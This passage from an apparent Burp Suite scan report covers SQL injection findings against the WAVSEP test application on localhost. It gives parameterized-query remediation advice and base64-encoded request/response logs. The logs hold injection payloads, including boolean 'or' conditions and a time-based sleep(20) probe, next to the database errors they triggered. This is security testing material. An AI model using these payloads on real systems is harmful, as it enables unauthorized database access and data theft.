yIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICcnJyBhdCBsaW5lIDEKCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTA4LUluamVjdGlvbkluQ2FsYy1OdW1lcmljLUJvb2xlYW5FeHBsb2l0LVdpdGgyMDBFcnJvcnMuanNwP21pbkJhbGFuYWNlPTEwMDAwMTU0NzgyMDElMjBvciUyMDk1MDglM2QwOTUwOCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTIwMEVycm9yL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU2OjIzIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNjMNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgOCAtIEluamVjdGlvbiBpbnRvIG51bWVyaWMgdmFsdWVzIGluIGEgY2FsY3VsYXRpb24gcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKU2V2ZXJhbCBhY2NvdW50cyBtYXRjaCB0aGUgY3JpdGVyaWEuCgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTA4LUluamVjdGlvbkluQ2FsYy1OdW1lcmljLUJvb2xlYW5FeHBsb2l0LVdpdGgyMDBFcnJvcnMuanNwP21pbkJhbGFuYWNlPTEwMDAwNTk3NDI3MTMlMjBvciUyMDkzNTglM2Q5MzYxIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU2OjIzIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzYNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgOCAtIEluamVjdGlvbiBpbnRvIG51bWVyaWMgdmFsdWVzIGluIGEgY2FsY3VsYXRpb24gcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKTm8gTWF0Y2guCgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTA4LUluamVjdGlvbkluQ2FsYy1OdW1lcmljLUJvb2xlYW5FeHBsb2l0LVdpdGgyMDBFcnJvcnMuanNwP21pbkJhbGFuYWNlPShzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKSBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTIwMEVycm9yL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU1OjIzIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNjMNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgOCAtIEluamVjdGlvbiBpbnRvIG51bWVyaWMgdmFsdWVzIGluIGEgY2FsY3VsYXRpb24gcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKU2V2ZXJhbCBhY2NvdW50cyBtYXRjaCB0aGUgY3JpdGVyaWEuCgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>8347216097583896576</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case09-InjectionInUpdate-Numeric-CommandInjection-With200Errors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case09-InjectionInUpdate-Numeric-CommandInjection-With200Errors.jsp [msgid parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msgid</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>'</b> was submitted in the msgid parameter, and a database error message was returned. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the msgid parameter. The application took <b>20006</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTA5LUluamVjdGlvbkluVXBkYXRlLU51bWVyaWMtQ29tbWFuZEluamVjdGlvbi1XaXRoMjAwRXJyb3JzLmpzcD9tc2dpZD0xJyBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTIwMEVycm9yL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxlbmd0aDogNTIzDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU1OjAzIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgOSAtIEluamVjdGlvbiBpbnRvIG51bWVyaWMgdmFsdWVzIGluIGFuIHVwZGF0ZSBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpFeGNlcHRpb24gZGV0YWlsczogamF2YS5zcWwuU1FMU3ludGF4RXJyb3JFeGNlcHRpb246IFlvdSBoYXZlIGFuIGVycm9yIGluIHlvdXIgU1FMIHN5bnRheDsgY2hlY2sgdGhlIG1hbnVhbCB0aGF0IGNvcnJlc3BvbmRzIHRvIHlvdXIgTXlTUUwgc2VydmVyIHZlcnNpb24gZm9yIHRoZSByaWdodCBzeW50YXggdG8gdXNlIG5lYXIgJycnIGF0IGxpbmUgMQoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTA5LUluamVjdGlvbkluVXBkYXRlLU51bWVyaWMtQ29tbWFuZEluamVjdGlvbi1XaXRoMjAwRXJyb3JzLmpzcD9tc2dpZD0oc2VsZWN0KmZyb20oc2VsZWN0KHNsZWVwKDIwKSkpYSkgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC0yMDBFcnJvci9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU1OjIzIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzcNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgOSAtIEluamVjdGlvbiBpbnRvIG51bWVyaWMgdmFsdWVzIGluIGFuIHVwZGF0ZSBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpRdWVyeSBleGVjdXRlZAoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>4187791368110788608</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case10-InjectionInSearchOrderBy-Numeric-BinaryDeliberateRuntimeError-With200Errors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case10-InjectionInSearchOrderBy-Numeric-BinaryDeliberateRuntimeError-With200Errors.jsp [orderby parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>orderby</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>'</b> was submitted in the orderby parameter, and a database error message was returned. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the orderby parameter. The application took <b>20004</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTEwLUluamVjdGlvbkluU2VhcmNoT3JkZXJCeS1OdW1lcmljLUJpbmFyeURlbGliZXJhdGVSdW50aW1lRXJyb3ItV2l0aDIwMEVycm9ycy5qc3A/b3JkZXJieT0xJyBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTIwMEVycm9yL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxlbmd0aDogNTM4DQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU1OjA2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDEwIC0gSW5qZWN0aW9uIGludG8gYW4gb3JkZXIgYnkgY2xhdXNlIChudW1lcmljKSBpbiBhIHNlYXJjaCBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpFeGNlcHRpb24gZGV0YWlsczogamF2YS5zcWwuU1FMU3ludGF4RXJyb3JFeGNlcHRpb246IFlvdSBoYXZlIGFuIGVycm9yIGluIHlvdXIgU1FMIHN5bnRheDsgY2hlY2sgdGhlIG1hbnVhbCB0aGF0IGNvcnJlc3BvbmRzIHRvIHlvdXIgTXlTUUwgc2VydmVyIHZlcnNpb24gZm9yIHRoZSByaWdodCBzeW50YXggdG8gd